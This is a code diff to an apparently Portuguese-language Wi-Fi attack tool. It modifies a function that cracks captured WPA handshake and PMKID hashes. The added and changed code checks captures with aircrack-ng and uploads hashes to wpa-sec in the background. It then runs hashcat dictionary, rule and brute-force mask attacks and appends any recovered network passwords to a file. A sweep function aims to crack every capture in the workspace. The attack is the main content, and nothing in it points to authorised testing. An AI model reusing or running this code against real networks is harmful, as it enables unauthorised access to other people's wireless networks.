@@ -418,17 +418,27 @@ def crack_hash_v7_expert(hash_file, bssid=None):
     essid_match = re.search(r"capture_([^_]+)", os.path.basename(hash_file))
     essid = essid_match.group(1) if essid_match else "Rede Desconhecida"
 
-    # Upload para Nuvem em paralelo
+    # Validação rigorosa do arquivo .cap
+    if hash_file.endswith(".cap"):
+        res, _ = run_command(f"aircrack-ng {hash_file}")
+        if res and ("1 handshake" not in res and "WPA (1 handshake)" not in res and "WPA (0 handshake)" in res):
+            supreme_log(f"CRACKER: Arquivo {hash_file} NÃO contém um handshake válido. Foi capturado 'lixo'. Abortando quebra deste arquivo.", log_type="error")
+            return None
+
+    # Upload para Nuvem em paralelo (desabilitado se for lixo)
     threading.Thread(target=upload_to_wpa_sec, args=(hash_file,), daemon=True).start()
     
-    wordlist = "/usr/share/wordlists/rockyou.txt"
+    # 1. Usa a Wordlist CV Master como prioridade, falha para rockyou ou default
+    wordlist = "cv_wordlist_elite.txt"
+    if not os.path.exists(wordlist):
+        wordlist = "/usr/share/wordlists/rockyou.txt"
     if not os.path.exists(wordlist):
         wordlist = "/tmp/dsi_expert.txt"
         with open(wordlist, "w") as f: f.write("12345678\npassword\nadmin123\n")
         
-    supreme_log(f"CRACKER: Iniciando Operação de Inteligência em {essid}...", log_type="cmd")
+    supreme_log(f"CRACKER: Iniciando Operação de Inteligência em {essid} usando wordlist local...", log_type="cmd")
     
-    # 1. Ataque de Dicionário + Regras
+    # 2. Ataque de Dicionário + Regras
     if hash_file.endswith(".16800"):
         cmd_rules = f"hashcat -m 16800 -a 0 {hash_file} {wordlist} -r /usr/share/hashcat/rules/best64.rule --force"
         subprocess.run(cmd_rules, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -444,31 +454,30 @@ def crack_hash_v7_expert(hash_file, bssid=None):
                 with open("cracked_passwords.txt", "a") as f: f.write(f"{essid}:{found_pass}\n")
                 return found_pass
 
-    # 2. Ataques de Máscara (só para hashcat)
+    # 3. Ataques de Máscara (só para hashcat)
     if hash_file.endswith(".16800"):
         # Verifica se já foi quebrado pelo ataque de regras
         res, _ = run_command(f"hashcat -m 16800 {hash_file} --show")
         if res and ":" in res:
             found_pass = res.split(":")[-1]
-            supreme_log(f"!!! SENHA ENCONTRADA (Regras): {essid} -> {found_pass}", log_type="error")
+            supreme_log(f"!!! SENHA ENCONTRADA (Dicionário CV): {essid} -> {found_pass}", log_type="error")
             with open("cracked_passwords.txt", "a") as f: f.write(f"{essid}:{found_pass}\n")
             return found_pass
             
         masks = ["?d?d?d?d?d?d?d?d", "?u?l?l?l?l?d?d?d", "202?d?d?d?d"]
         for mask in masks:
-            supreme_log(f"CRACKER: Testando Máscara {mask} em {essid}...", log_type="cmd")
+            supreme_log(f"CRACKER: Testando Máscara Cega (Força Bruta Parcial): {mask} em {essid}...", log_type="cmd")
             cmd_mask = f"hashcat -m 16800 -a 3 {hash_file} {mask} --force"
             subprocess.run(cmd_mask, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             res, _ = run_command(f"hashcat -m 16800 {hash_file} --show")
             if res and ":" in res: 
                 found_pass = res.split(":")[-1]
-                supreme_log(f"!!! SENHA ENCONTRADA (Máscara): {essid} -> {found_pass}", log_type="error")
+                supreme_log(f"!!! SENHA ENCONTRADA (Máscara Matemática): {essid} -> {found_pass}", log_type="error")
                 with open("cracked_passwords.txt", "a") as f: f.write(f"{essid}:{found_pass}\n")
                 return found_pass
                 
-    supreme_log(f"CRACKER: A senha de {essid} não foi encontrada nos ataques iniciais.", log_type="info")
+    supreme_log(f"CRACKER: A senha de {essid} não foi encontrada nos dicionários/máscaras locais. Processamento movido para Nuvem.", log_type="error")
     return None
-
 def scan_and_crack_all():
     """ Inteligência Nato: Varre o workspace e tenta quebrar TUDO o que encontrar """
     supreme_log("MAGISTRADO: Iniciando varredura profunda de arquivos locais...", log_type="cmd")
